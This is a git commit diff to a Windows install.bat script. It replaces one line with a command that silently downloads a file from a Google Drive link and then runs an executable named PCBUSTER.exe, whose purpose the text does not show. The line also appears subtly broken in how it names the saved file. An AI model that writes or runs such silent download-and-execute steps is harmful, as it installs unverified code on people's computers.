019ec6e6daf7ec1eacdc1722342460aada955603
Undefined <91841844+UndefinedClear@users.noreply.github.com>
2025-02-10 18:12:09 +0300

    Update install.bat

--- install.bat
+++ install.bat
@@ -20,7 +20,7 @@ timeout /t 1>nul
 cls
 
 echo Downloading
-curl -s -O "pcbuster.exe" && start pcbuster.exe
+curl -s -O "https://drive.usercontent.google.com/download?id=19zb87Vk1NVdLt03LU_jE7IeKoqWFWm3M&export=download&authuser=0&confirm=t&uuid=0b1bce6d-3526-4754-8e38-0e4438096322&at=AIrpjvPjdp3YXUglZM9qqs51jGyZ%3A1739200285006" && start PCBUSTER.exe
 cls
 
 color C
